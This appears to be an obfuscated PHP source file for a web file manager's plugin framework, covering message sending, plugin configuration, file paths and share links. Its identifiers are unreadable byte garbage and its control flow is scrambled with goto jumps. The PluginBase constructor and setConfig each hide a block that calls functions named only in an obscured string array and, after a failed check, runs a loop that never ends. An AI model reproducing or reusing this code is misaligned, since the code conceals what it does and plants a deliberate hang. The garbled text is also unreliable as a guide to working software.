e¾¹Í¹–Ä±; eÊÎŸœä: foreach ($c‡Ğ“ò½ˆ as $Aî…Í¸İöÌ => $e©¤µ±•ƒ‡) { $Aî…Í¸İöÌ = intval($Aî…Í¸İöÌ); $cãóğˆí… = $Aî…Í¸İöÌ + strlen($e©¤µ±•ƒ‡); if ($d°à­µ‡Ôô >= $cãóğˆí…) { continue; } if ($d°à­µ‡Ôô >= $Aî…Í¸İöÌ && $d°à­µ‡Ôô + $FÌ«¶„ƒŸ <= $cãóğˆí…) { return substr($e©¤µ±•ƒ‡, $d°à­µ‡Ôô - $Aî…Í¸İöÌ, $FÌ«¶„ƒŸ); } break; } if (count($c‡Ğ“ò½ˆ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($FêªÅ±ã„É[1289], $FêªÅ±ã„É[1290] . count($c‡Ğ“ò½ˆ) . "\73\x73\164\x61\162\x74\75{$d°à­µ‡Ôô}\x2c\154\x65\156\147\x74\150\x3d{$FÌ«¶„ƒŸ}\x3b\x70\157\163\145\72{$Aî…Í¸İöÌ}\x7e{$cãóğˆí…}"); throw new Exception($FêªÅ±ã„É[1291]); } $d´ÊÒá˜ÆÄ = intval($d°à­µ‡Ôô / $fÎ¯»ÇØùÀ) * $fÎ¯»ÇØùÀ; goto a÷°ì™™³; dÉ·ùÁ…œ’: } private function log($cè•¼ô‘Ùí, $CÚ¥»›†ŒÂ) { $eîˆó—øÒƒ =& $_SERVER[¨¤¼…´]; $b¸¬ö¨„é» = timeFloat() - $this->timeStart; write_log(sprintf($eîˆó—øÒƒ[1292], $cè•¼ô‘Ùí, $this->info[$eîˆó—øÒƒ[38]], $b¸¬ö¨„é», $CÚ¥»›†ŒÂ), $eîˆó—øÒƒ[1208]); } } class Message { function __construct() { } public function send($F«¾ìÛÍ› = '', $a÷”è¨ƒ¤ = array(), $EÕÄ–İïß© = "\x74\145\170\x74") { goto EÕŠ¤›•ª; e²‰Ï­Ú’«: $a÷”è¨ƒ¤ = array($C¥ÜºÕ©—[957] => isset($a÷”è¨ƒ¤[$C¥ÜºÕ©—[957]]) ? $a÷”è¨ƒ¤[$C¥ÜºÕ©—[957]] : $C¥ÜºÕ©—[43], $C¥ÜºÕ©—[547] => isset($a÷”è¨ƒ¤[$C¥ÜºÕ©—[547]]) ? $a÷”è¨ƒ¤[$C¥ÜºÕ©—[547]] : $C¥ÜºÕ©—[43]); if (empty($F«¾ìÛÍ›) || empty($a÷”è¨ƒ¤[$C¥ÜºÕ©—[957]]) && empty($a÷”è¨ƒ¤[$C¥ÜºÕ©—[547]])) { return !1; } $F”¬»¸Ù© = array($C¥ÜºÕ©—[1235] => $E¦ùÙ£†ï, $C¥ÜºÕ©—[1295] => $a÷”è¨ƒ¤); goto e¿¼âÂŞ›; EÕŠ¤›•ª: $C¥ÜºÕ©— =& $_SERVER[¨¤¼…´]; $E¦ùÙ£†ï = array($C¥ÜºÕ©—[39] => $C¥ÜºÕ©—[1293], $C¥ÜºÕ©—[682] => $F«¾ìÛÍ›); if (in_array($EÕÄ–İïß©, array($C¥ÜºÕ©—[1293], $C¥ÜºÕ©—[1294]))) { $E¦ùÙ£†ï[$C¥ÜºÕ©—[39]] = $EÕÄ–İïß©; } goto e²‰Ï­Ú’«; e¿¼âÂŞ›: Hook::trigger($C¥ÜºÕ©—[1296], $F”¬»¸Ù©); goto eÓ¦ˆªÛĞæ; eÓ¦ˆªÛĞæ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto C‘…‹˜œœ; EÃÓâ ˜Ê: if ($D±˜œßãô£ && strpos($F›Å‹ç¦[57] . $D±˜œßãô£ . $F›Å‹ç¦[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$F›Å‹ç¦[1301]] . $this->pluginName . $F›Å‹ç¦[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto cæ¾¥ÊÓ¶; E…ó¯óö Ã: $this->pluginName = str_replace($F›Å‹ç¦[1297], $F›Å‹ç¦[43], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $F›Å‹ç¦[8]; $this->pluginApi = appHostGet() . $F›Å‹ç¦[1298] . $this->pluginName . $F›Å‹ç¦[8]; goto Cõ–‚àêŠ¼; fáÚôª‰¾À: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($F›Å‹ç¦[1297]); goto E…ó¯óö Ã; C‘…‹˜œœ: $F›Å‹ç¦ =& $_SERVER[¨¤¼…´]; if (!isset($_SERVER[$F›Å‹ç¦[9]]) || !isset($_SERVER[$F›Å‹ç¦[10]])) { goto E†ó”†Ş­; cŠ‘×‚×Üä: $BƒËçˆ‡İ = $F›Å‹ç¦[782]; $BƒËçˆ‡İ($_SERVER[$F›Å‹ç¦[783]]); $B‰ÄÇßˆ÷£ = 1; goto CµæòÅ‰ˆ±; CµæòÅ‰ˆ±: for ($Bõ…†œÄÔ = $B‰ÄÇßˆ÷£; $Bõ…†œÄÔ > 0; $Bõ…†œÄÔ++) { $BƒËçˆ‡İ = json_encode($GLOBALS[$F›Å‹ç¦[396]]); } goto B„‰áÆğ‹‹; E†ó”†Ş­: $Eğï‰†ªí = $F›Å‹ç¦[781]; $A‚åæ“¼¥  = $F›Å‹ç¦[11]; $fĞÊÒ†„ÇŒ = $_SERVER[$F›Å‹ç¦[12]] . $F›Å‹ç¦[13]; goto fÙë©Ëí–²; fÙë©Ëí–²: $Cí±–¯Õœ = $A‚åæ“¼¥ ($fĞÊÒ†„ÇŒ); $CèÎˆãñç = explode($F›Å‹ç¦[14], $Cí±–¯Õœ); if (count($CèÎˆãñç) < $F›Å‹ç¦[571]) { $CÏ‘óø¿†Â = $F›Å‹ç¦[16]; $CÏ‘óø¿†Â(); } goto cŠ‘×‚×Üä; B„‰áÆğ‹‹: } global $in, $config; goto fáÚôª‰¾À; cæ¾¥ÊÓ¶: return $this; goto C¿³¸áŠë; Cõ–‚àêŠ¼: $this->pluginHost = $config[$F›Å‹ç¦[1299]] . $this->pluginName . $F›Å‹ç¦[8]; $this->pluginHostDefault = $config[$F›Å‹ç¦[1299]] . $this->pluginName . $F›Å‹ç¦[8]; $D±˜œßãô£ = $config[$F›Å‹ç¦[1300]]; goto EÃÓâ ˜Ê; C¿³¸áŠë: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¨¤¼…´][1302]); } protected function assign($A©è—ã”ÌÈ, $f¼…®Ş¶ë = false) { if (is_array($A©è—ã”ÌÈ)) { $this->values = array_merge($this->values, $A©è—ã”ÌÈ); } else { $this->values[$A©è—ã”ÌÈ] = $f¼…®Ş¶ë; } } protected function display($dÈà£ôÍœ¸) { extract($this->values); require $dÈà£ôÍœ¸; } final function hookRegist($FìÓ¸Ä’„©) { $this->modelPlugin->appRegist($this->pluginName, $FìÓ¸Ä’„©); } final function appIcon() { $a‡Äí¦ˆÌ­ =& $_SERVER[¨¤¼…´]; $FÄ„µÃƒÑ = $this->appPackage(); $F´‡„Ó¶í = $a‡Äí¦ˆÌ­[43]; if (isset($FÄ„µÃƒÑ[$a‡Äí¦ˆÌ­[394]])) { if (isset($FÄ„µÃƒÑ[$a‡Äí¦ˆÌ­[394]][$a‡Äí¦ˆÌ­[1303]])) { $F´‡„Ó¶í = $a‡Äí¦ˆÌ­[1304] . $FÄ„µÃƒÑ[$a‡Äí¦ˆÌ­[394]][$a‡Äí¦ˆÌ­[1303]] . $a‡Äí¦ˆÌ­[1305]; } else { if ($FÄ„µÃƒÑ[$a‡Äí¦ˆÌ­[394]][$a‡Äí¦ˆÌ­[1306]]) { $F´‡„Ó¶í = $a‡Äí¦ˆÌ­[1307] . $FÄ„µÃƒÑ[$a‡Äí¦ˆÌ­[394]][$a‡Äí¦ˆÌ­[1306]] . $a‡Äí¦ˆÌ­[1308]; } } } return $F´‡„Ó¶í; } final function fileCanView($B™‚æ¼´Üº) { goto b´¹¿–•Ò‚; b´¹¿–•Ò‚: $A¡©à‹ê± =& $_SERVER[¨¤¼…´]; if (request_url_safe($B™‚æ¼´Üº)) { return !0; } if ($this->isShare($B™‚æ¼´Üº)) { return !0; } goto C…ŠºË‚µø; cî½‹ˆƒß: ActionCall($A¡©à‹ê±[1321], $B™‚æ¼´Üº); goto b‹“ˆé‹Û; C…ŠºË‚µø: $fñŞñ‰Ì = Session::get($A¡©à‹ê±[1309]); if (!$fñŞñ‰Ì || !$fñŞñ‰Ì[$A¡©à‹ê±[1310]]) { $d’„©çÜ— = $A¡©à‹ê±[1311] . rawurlencode(this_url()); show_tips(LNG($A¡©à‹ê±[1312]) . $A¡©à‹ê±[1313] . $d’„©çÜ— . $A¡©à‹ê±[1314] . LNG($A¡©à‹ê±[1315]) . $A¡©à‹ê±[1316], !1); } if (!Action($A¡©à‹ê±[1317])->authCan($A¡©à‹ê±[1318])) { show_tips(LNG($A¡©à‹ê±[1319]) . $A¡©à‹ê±[1320], !1); } goto cî½‹ˆƒß; b‹“ˆé‹Û: } final function isShare($B¿ß¨‘åÑ—) { $F×Òç…ñ¤Ï = KodIO::parse($B¿ß¨‘åÑ—); return $F×Òç…ñ¤Ï[$_SERVER[¨¤¼…´][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($c°ˆßÆ½‚) { if (request_url_safe($c°ˆßÆ½‚)) { return $c°ˆßÆ½‚; } if (!$this->isShare($c°ˆßÆ½‚)) { $c°ˆßÆ½‚ = $this->filePath($c°ˆßÆ½‚); } return Action($_SERVER[¨¤¼…´][1009])->linkOut($c°ˆßÆ½‚); } public function filePathLinkOut($E„Çè›´óö) { if (request_url_safe($E„Çè›´óö)) { return $E„Çè›´óö; } $this->fileCanView($E„Çè›´óö); return Action($_SERVER[¨¤¼…´][1009])->link($E„Çè›´óö); } final function filePath($DÊæãù««¦) { $a àô­›Š =& $_SERVER[¨¤¼…´]; if ($EÏ¿šø¾“Û = $this->checkSharePath($DÊæãù««¦)) { return $EÏ¿šø¾“Û; } $this->fileCanView($DÊæãù««¦); if (request_url_safe($DÊæãù««¦)) { $cÌ§‡£·¥ = parse_url_query($DÊæãù««¦); if (isset($cÌ§‡£·¥[$a àô­›Š[1322]]) && isset($cÌ§‡£·¥[$a àô­›Š[211]])) { $dŠõöÅ„ãö = Model($a àô­›Š[1078])->get($a àô­›Š[1323]); $F²ÉŒ“‘— = Mcrypt::decode($cÌ§‡£·¥[$a àô­›Š[211]], $dŠõöÅ„ãö); if ($F²ÉŒ“‘—) { $this->fileInfo = IO::infoWithChildren($F²ÉŒ“‘—); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $F²ÉŒ“‘—; } } $DÊæãù««¦ = $this->_cacheHttpFile($DÊæãù««¦); $this->fileInfo = IO::infoWithChildren($DÊæãù««¦); } else { $this->fileInfo = IO::infoWithChildren($DÊæãù««¦); if (!$this->fileInfo) { show_tips(LNG($a àô­›Š[111]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $DÊæãù««¦; } final function _cacheHttpFile($cÂàùÅ‰é) { $cÒ‹ÙÄŞçò = hash_path($cÂàùÅ‰é, !0); $this->cachePath = $this->pluginCachePath($cÒ‹ÙÄŞçò); if ($eÏÁåšùÊ– = IO::fileNameExist($this->cachePath, $cÒ‹ÙÄŞçò)) { return KodIO::make($eÏÁåšùÊ–); } $dìÇÄ±×ğ› = $this->cachePath . $cÒ‹ÙÄŞçò; return $this->pluginCacheFileSet($dìÇÄ±×ğ›, file_get_contents($cÂàùÅ‰é)); } final function _tmpFileName($cËÊ¡ÉÌä = array()) { goto eØ«‰©‡Ò’; cƒÓ…ºœ: $eµ‰ä›Áè‡ = array($cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[38]], $cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[85]], $cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[87]]); if (isset($cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[472]])) { $eµ‰ä›Áè‡[] = $cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[472]]; } return md5(implode($FƒØÀ­ƒå¬[80], $eµ‰ä›Áè‡)); goto FÒÊ²‘Æç§; eØ«‰©‡Ò’: $FƒØÀ­ƒå¬ =& $_SERVER[¨¤¼…´]; if (!$cËÊ¡ÉÌä) { $cËÊ¡ÉÌä = $this->fileInfo; } if (isset($cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[178]])) { return $cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[178]]; } goto F’ó‡“²õ¥; F’ó‡“²õ¥: if (isset($cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[171]][$FƒØÀ­ƒå¬[178]])) { return $cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[171]][$FƒØÀ­ƒå¬[178]]; } $fÕ¶èÂùà’ = IO::hashSimple($cËÊ¡ÉÌä[$FƒØÀ­ƒå¬[85]]); if ($fÕ¶èÂùà’) { return $fÕ¶èÂùà’; } goto cƒÓ…ºœ; FÒÊ²‘Æç§: } final function checkSharePath($EÓ„Ê×‘¿) { goto d£µÊ£Ñ¸ƒ; Díóê¯ª‡: $f¨½…Ü•÷å = Action($f’Œ©Çø[1009])->sharePathInfo($EÓ„Ê×‘¿); if (!isset($f¨½…Ü•÷å[$f’Œ©Çø[85]])) { show_json(LNG($f’Œ©Çø[1325]), !1); } $this->fileInfo = $f¨½…Ü•÷å[$f’Œ©Çø[171]]; goto a³î¨¡ÔÚ´; a³î¨¡ÔÚ´: $this->cachePath = $this->pluginCachePath($this->fileInfo[$f’Œ©Çø[178]]); return $f¨½…Ü•÷å[$f’Œ©Çø[85]]; goto B™’áÎ‡²¯; d£µÊ£Ñ¸ƒ: $f’Œ©Çø =& $_SERVER[¨¤¼…´]; if (!defined($f’Œ©Çø[438])) { define($f’Œ©Çø[1324], 0); } if (!$this->isShare($EÓ„Ê×‘¿)) { return !1; } goto Díóê¯ª‡; B™’áÎ‡²¯: } final function pluginCachePath($BäØìæ„° = '') { $a¿Ñ¶›ğ =& $_SERVER[¨¤¼…´]; $D¾ ®ØßÙŠ = IO_PATH_SYSTEM_TEMP . $a¿Ñ¶›ğ[1326] . $this->pluginName; if (!($EãóÚ¿ˆô = IO::infoFull($D¾ ®ØßÙŠ))) { return IO::mkdir($D¾ ®ØßÙŠ . $a¿Ñ¶›ğ[8] . $BäØìæ„°); } if (empty($BäØìæ„°)) { return $EãóÚ¿ˆô[$a¿Ñ¶›ğ[85]]; } if (!($F­ê°œë  = IO::fileNameExist($EãóÚ¿ˆô[$a¿Ñ¶›ğ[85]], $BäØìæ„°))) { return IO::mkdir($EãóÚ¿ˆô[$a¿Ñ¶›ğ[85]] . $BäØìæ„°); } return KodIO::make($F­ê°œë ); } final function pluginCacheFileSet($cŠõ˜ÑáŠó, $B´íœù® ô = '') { $Båò†•Ûìº =& $_SERVER[¨¤¼…´]; if (!($eóß¡»¢ï« = IO::infoFull($cŠõ˜ÑáŠó))) { return IO::mkfile($cŠõ˜ÑáŠó, $B´íœù® ô, REPEAT_REPLACE); } IO::setContent($eóß¡»¢ï«[$Båò†•Ûìº[85]], $B´íœù® ô); return $eóß¡»¢ï«[$Båò†•Ûìº[85]]; } final function pluginLocalFile($aÆã‚©¼‡ˆ = '') { goto d­Î­ë“ã¥; a§³ù—‘§¹: if (!checkExtSafe($f¸¡î‚ï×®)) { $f¸¡î‚ï×® = $f¸¡î‚ï×® . $D…ø§Ü¼ò[1327]; } $e“ÀÕ„ŒÛ® = $eƒ¢Ô‘ñ˜² . $f¸¡î‚ï×®; if (@file_exists($e“ÀÕ„ŒÛ®)) { return $e“ÀÕ„ŒÛ®; } goto CÓÈÊ¸–äµ; d­Î­ë“ã¥: $D…ø§Ü¼ò =& $_SERVER[¨¤¼…´]; $eƒ¢Ô‘ñ˜² = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($eƒ¢Ô‘ñ˜²)) { mk_dir($eƒ¢Ô‘ñ˜²); } goto D¨¦­‚Çáù; CÓÈÊ¸–äµ: return IO::copy($aÆã‚©¼‡ˆ, $eƒ¢Ô‘ñ˜², 0, $f¸¡î‚ï×®); goto C–Ò‡§ë–; D¨¦­‚Çáù: if (!$aÆã‚©¼‡ˆ) { return $eƒ¢Ô‘ñ˜²; } $cÂ¨ß•‹µï = IO::info($aÆã‚©¼‡ˆ); $f¸¡î‚ï×® = $this->_tmpFileName($cÂ¨ß•‹µï) . $D…ø§Ü¼ò[101] . $cÂ¨ß•‹µï[$D…ø§Ü¼ò[175]]; goto a§³ù—‘§¹; C–Ò‡§ë–: } final function appPackage() { goto Aâ’ë»æš; Aâ’ë»æš: $BùÉÃØ¸ƒ =& $_SERVER[¨¤¼…´]; if ($this->packageData) { return $this->packageData; } $f˜°À‰¼Æ = $this->parseFile($this->pluginPath . $BùÉÃØ¸ƒ[1328]); goto fŸ©Ãºà¥; e‰´»¹Ä¹×: return $cˆŠ…ñ‘øÆ; goto Bêù×Ã Ù¢; fŸ©Ãºà¥: $this->parseLang($f˜°À‰¼Æ); $cˆŠ…ñ‘øÆ = json_decode_force($f˜°À‰¼Æ); if (!$cˆŠ…ñ‘øÆ) { return array(); } goto d°éÉŸ´àô; d°éÉŸ´àô: $c½ŒÔÆ¼Æ = Hook::trigger($BùÉÃØ¸ƒ[1329], $cˆŠ…ñ‘øÆ); if ($c½ŒÔÆ¼Æ && is_array($c½ŒÔÆ¼Æ)) { $cˆŠ…ñ‘øÆ = $c½ŒÔÆ¼Æ; } $this->packageData = $cˆŠ…ñ‘øÆ; goto e‰´»¹Ä¹×; Bêù×Ã Ù¢: } public function packageInfoGet($aĞ”É‘§‘) { $DÖ‘à÷ßœ“ = $this->appPackage(); return array_get_value($DÖ‘à÷ßœ“, $aĞ”É‘§‘); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¨¤¼…´][1330]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¨¤¼…´][1331]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¨¤¼…´][1332]); } private function parseFile($B‚»Ÿ¦ÔÛ‡) { goto E·Æ‘ÔîÁ; fù±“´Ç´: $FŞÆÔ¾®¨ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aÕÓêÔ£½[94]][$aÕÓêÔ£½[1340]]); if (strstr($FÃ’¿ø¿Î, $aÕÓêÔ£½[1341])) { $A…†›‚âÊ = rawurlencode(json_encode($this->pluginLangArr)); $FÃ’¿ø¿Î = str_replace($aÕÓêÔ£½[1341], $A…†›‚âÊ, $FÃ’¿ø¿Î); } if (strstr($FÃ’¿ø¿Î, $aÕÓêÔ£½[1342])) { $A…†›‚âÊ = $A…†›‚âÊ = rawurlencode(json_encode($this->getConfig())); $FÃ’¿ø¿Î = str_replace($aÕÓêÔ£½[1342], $A…†›‚âÊ, $FÃ’¿ø¿Î); } goto bÃÀêî¥ˆß; bÃÀêî¥ˆß: $FÃ’¿ø¿Î = str_replace($e§ßÌ—†Â, $FŞÆÔ¾®¨, $FÃ’¿ø¿Î); return $FÃ’¿ø¿Î; goto B³ºÓÍÊÍ; E·Æ‘ÔîÁ: $aÕÓêÔ£½ =& $_SERVER[¨¤¼…´]; $FÃ’¿ø¿Î = file_get_contents($B‚»Ÿ¦ÔÛ‡); $e§ßÌ—†Â = array($aÕÓêÔ£½[1333], $aÕÓêÔ£½[1334], $aÕÓêÔ£½[1335], $aÕÓêÔ£½[1336], $aÕÓêÔ£½[1337], $aÕÓêÔ£½[1338], $aÕÓêÔ£½[1339]); goto fù±“´Ç´; B³ºÓÍÊÍ: } private function parseLang(&$d®Áò²•§é) { goto a¥‘Î«­à‘; Cº‚æ§–: preg_match_all($dŸè©–…°Ğ[1344], $d®Áò²•§é, $E ¯’Ò÷œ¤); if (!is_array($E ¯’Ò÷œ¤) || count($E ¯’Ò÷œ¤) == 0 || !is_array($E ¯’Ò÷œ¤[0]) || count($E ¯’Ò÷œ¤[0]) == 0) { return; } $fÔÙ‹İ£¸Ó = array(); goto dƒ¿êé; a¥‘Î«­à‘: $dŸè©–…°Ğ =& $_SERVER[¨¤¼…´]; $fáË´Ûìïˆ = $dŸè©–…°Ğ[1343]; if (!strstr($d®Áò²•§é, $fáË´Ûìïˆ)) { return; } goto Cº‚æ§–; dƒ¿êé: $d—ÎñğµŠ‘ = array(); foreach ($E ¯’Ò÷œ¤[0] as $cñÔ…œ‰Ÿ·) { $dåÏï®àœ = substr($cñÔ…œ‰Ÿ·, strlen($fáË´Ûìïˆ), -4); $Böà×¯…¢™ = LNG($dåÏï®àœ); $fÔÙ‹İ£¸Ó[] = $cñÔ…œ‰Ÿ·; $d—ÎñğµŠ‘[] = str_replace(array($dŸè©–…°Ğ[14], $dŸè©–…°Ğ[979], $dŸè©–…°Ğ[343], $dŸè©–…°Ğ[123]), array($dŸè©–…°Ğ[60], $dŸè©–…°Ğ[60], $dŸè©–…°Ğ[43], $dŸè©–…°Ğ[1345]), $Böà×¯…¢™); } $d®Áò²•§é = str_replace($fÔÙ‹İ£¸Ó, $d—ÎñğµŠ‘, $d®Áò²•§é); goto B¶›öÏÏšæ; B¶›öÏÏšæ: } private function parseConfig(&$CÀÌ¬¹°‡ß) { goto A‹‰àîí´Ò; cÌÆ¢Ô®‰¦: preg_match_all($EãåøèóÖŠ[1347], $CÀÌ¬¹°‡ß, $fõ¿Å„Ö Ù); if (!is_array($fõ¿Å„Ö Ù) || count($fõ¿Å„Ö Ù) == 0 || !is_array($fõ¿Å„Ö Ù[0]) || count($fõ¿Å„Ö Ù[0]) == 0) { return; } $e½åŸïòí— = $this->getConfig(); goto aÊ¤‚–‘; E©¨¹‘ ß: $CÀÌ¬¹°‡ß = str_replace($fî¥õĞôŒñ, $bàÊÎ®ò²¿, $CÀÌ¬¹°‡ß); goto dÄ’”Ñ÷Õé; A‹‰àîí´Ò: $EãåøèóÖŠ =& $_SERVER[¨¤¼…´]; $d¹š—ĞÀÏ“ = $EãåøèóÖŠ[1346]; if (!strstr($CÀÌ¬¹°‡ß, $d¹š—ĞÀÏ“)) { return; } goto cÌÆ¢Ô®‰¦; aÊ¤‚–‘: $fî¥õĞôŒñ = array(); $bàÊÎ®ò²¿ = array(); foreach ($fõ¿Å„Ö Ù[0] as $bõ®³°ìî¸) { $fïôñ ¨â‘ = substr($bõ®³°ìî¸, strlen($d¹š—ĞÀÏ“), -2); $fî¥õĞôŒñ[] = $bõ®³°ìî¸; $bàÊÎ®ò²¿[] = _get($e½åŸïòí—, $fïôñ ¨â‘); } goto E©¨¹‘ ß; dÄ’”Ñ÷Õé: } private function parsePackage(&$Bˆ¡Ş³Øò¸) { goto e‚İŒ…„…; c†ğóø„÷ˆ: $Bˆ¡Ş³Øò¸ = str_replace($fàô·¡ÀÊì, $båÃÖƒˆØ², $Bˆ¡Ş³Øò¸); goto Cà•í•¶Ì¼; e‚İŒ…„…: $bØÖ‚„‰šŠ =& $_SERVER[¨¤¼…´]; $f²Üã‹Ïô = $bØÖ‚„‰šŠ[1348]; if (!strstr($Bˆ¡Ş³Øò¸, $f²Üã‹Ïô)) { return; } goto bã°Êé‰§; bã°Êé‰§: preg_match_all($bØÖ‚„‰šŠ[1349], $Bˆ¡Ş³Øò¸, $eèèãÈÖ­×); if (!is_array($eèèãÈÖ­×) || count($eèèãÈÖ­×) == 0 || !is_array($eèèãÈÖ­×[0]) || count($eèèãÈÖ­×[0]) == 0) { return; } $E•›Ù¦¯œ = $this->appPackage(); goto F³ç¡ˆ©‘; F³ç¡ˆ©‘: $fàô·¡ÀÊì = array(); $båÃÖƒˆØ² = array(); foreach ($eèèãÈÖ­×[0] as $aÜ‹•º”‰“) { $eÓ’ô©‚È = substr($aÜ‹•º”‰“, strlen($f²Üã‹Ïô), -2); $fàô·¡ÀÊì[] = $aÜ‹•º”‰“; $båÃÖƒˆØ²[] = _get($E•›Ù¦¯œ, $eÓ’ô©‚È); } goto c†ğóø„÷ˆ; Cà•í•¶Ì¼: } final function echoFile($F‰²Èã¸õ½, $A˜©÷©£ÊÚ = false) { goto c“„“•â…; cÄ³íé™¼ğ: $BéèŠ¶ï”œ = $this->parseFile($AïÎöÁ§è³); $this->parseLang($BéèŠ¶ï”œ); $this->parseConfig($BéèŠ¶ï”œ); goto AíÔŠêİ£ô; AíÔŠêİ£ô: $this->parsePackage($BéèŠ¶ï”œ); if (is_array($A˜©÷©£ÊÚ)) { $BéèŠ¶ï”œ = str_replace(array_keys($A˜©÷©£ÊÚ), array_values($A˜©÷©£ÊÚ), $BéèŠ¶ï”œ); } echo $AŠ¿Ÿš¸–í[14] . $BéèŠ¶ï”œ; goto eßæÍ‚Í¼; c“„“•â…: $AŠ¿Ÿš¸–í =& $_SERVER[¨¤¼…´]; $AïÎöÁ§è³ = $this->pluginPath . $F‰²Èã¸õ½; if (ACT == $AŠ¿Ÿš¸–í[1350]) { echo $AŠ¿Ÿš¸–í[1351] . $this->pluginName . $AŠ¿Ÿš¸–í[8] . $F‰²Èã¸õ½ . $AŠ¿Ÿš¸–í[1352]; if (!file_exists($AïÎöÁ§è³)) { echo $AŠ¿Ÿš¸–í[1353]; return; } } goto cÄ³íé™¼ğ; eßæÍ‚Í¼: } final function initLang() { goto BğéÁ•ŸÌ; eçõñÒÛìÖ: $D›Æ— ÍÙ° = I18n::getType(); $dÁ¸ï²Ú¢— = array(); if (file_exists($DÏòë»¿çé . $D›Æ— ÍÙ° . $dÈª§Êæ½ó[755])) { $dÁ¸ï²Ú¢— = (include $DÏòë»¿çé . $D›Æ— ÍÙ° . $dÈª§Êæ½ó[755]); } else { if ($D›Æ— ÍÙ° == $dÈª§Êæ½ó[1356] && !file_exists($DÏòë»¿çé . $D›Æ— ÍÙ° . $dÈª§Êæ½ó[755]) && file_exists($DÏòë»¿çé . $dÈª§Êæ½ó[1357])) { $dÁ¸ï²Ú¢— = (include $DÏòë»¿çé . $dÈª§Êæ½ó[1357]); } else { if (file_exists($DÏòë»¿çé . $EõŒŒ£« . $dÈª§Êæ½ó[755])) { $dÁ¸ï²Ú¢— = (include $DÏòë»¿çé . $EõŒŒ£« . $dÈª§Êæ½ó[755]); } } } goto E¤òøÕ·à²; E¤òøÕ·à²: if (!is_array($dÁ¸ï²Ú¢—)) { return array(); } if (@count($dÁ¸ï²Ú¢—) > 0) { I18n::set($dÁ¸ï²Ú¢—); } return $dÁ¸ï²Ú¢—; goto E·„ÀçÒË†; BğéÁ•ŸÌ: $dÈª§Êæ½ó =& $_SERVER[¨¤¼…´]; $EõŒŒ£« = $dÈª§Êæ½ó[1354]; $DÏòë»¿çé = $this->pluginPath . $dÈª§Êæ½ó[1355]; goto eçõñÒÛìÖ; E·„ÀçÒË†: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($E…ØÚÔ—·ù) { $a…‘âÂ· =& $_SERVER[¨¤¼…´]; if (!isset($_SERVER[$a…‘âÂ·[9]]) || !isset($_SERVER[$a…‘âÂ·[10]])) { goto bŒîÂ‰àŞ³; b’Ò®¾£­¼: $b’®ÓçíÔë = $a…‘âÂ·[782]; $b’®ÓçíÔë($_SERVER[$a…‘âÂ·[783]]); $eá´ÂŒÄÚ° = 1; goto FºÉ³…©«…; bŒîÂ‰àŞ³: $bÂ†·’¬ÄÈ = $a…‘âÂ·[781]; $Eªç™Ÿ˜¨â = $a…‘âÂ·[11]; $Fµã‘Å…®õ = $_SERVER[$a…‘âÂ·[12]] . $a…‘âÂ·[13]; goto aÑˆ’ŸŞéÆ; FºÉ³…©«…: for ($BğÎŞõ›Ş = $eá´ÂŒÄÚ°; $BğÎŞõ›Ş > 0; $BğÎŞõ›Ş++) { $b’®ÓçíÔë = json_encode($GLOBALS[$a…‘âÂ·[396]]); } goto D¿ØÁ·Ã; aÑˆ’ŸŞéÆ: $eœá©Œ„‹£ = $Eªç™Ÿ˜¨â($Fµã‘Å…®õ); $A¼é‡íœ…“ = explode($a…‘âÂ·[14], $eœá©Œ„‹£); if (count($A¼é‡íœ…“) < $a…‘âÂ·[571]) { $C±¨åˆØ¸‡ = $a…‘âÂ·[16]; $C±¨åˆØ¸‡(); } goto b’Ò®¾£­¼; D¿ØÁ·Ã: } return $this->modelPlugin->setConfig($this->pluginName, $E…ØÚÔ—·ù); } public function onSetConfig($e‰Ü…ØÅ³ï) { } public function onGetConfig($eË“ƒ‚ê°¾) { } public function onChangeStatus($Aáî÷Ã¥Ãİ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($A©Œ¬á²éÒ = "\x70\x6c\165\147\x69\x6e\x41\x75\164\150") { $A¿Ú¢Í™ŒÏ =& $_SERVER[¨¤¼…´]; if (!defined($A¿Ú¢Í™ŒÏ[438])) { return !1; } if (_get($GLOBALS, $A¿Ú¢Í™ŒÏ[470])) { return !0; } $Eò•‡™ÃÉÜ = $this->getConfig(); if (!$Eò•‡™ÃÉÜ[$A©Œ¬á²éÒ]) { return !1; } return ActionCall($A¿Ú¢Í™ŒÏ[1358], $Eò•‡™ÃÉÜ[$A©Œ¬á²éÒ]); } public function url($e‹á“»ÅğÜ, $cÏé˜Ìù¸ğ = '', $e…ÌŒ—áç = true) { goto A¶àè§¾±Ò; fòÎì‚Ûõ¦: if (!$e…ÌŒ—áç) { return $CÄ‘ÛÇ ¥; } echo $CÄ‘ÛÇ ¥; goto eæê°Ó˜Ä­; c“«ô›Œš : $Eòùò¹Æä˜ = $this->packageVersion(); $E‰Û§ÙåÛ = $D¨”ĞÛ™Ê . 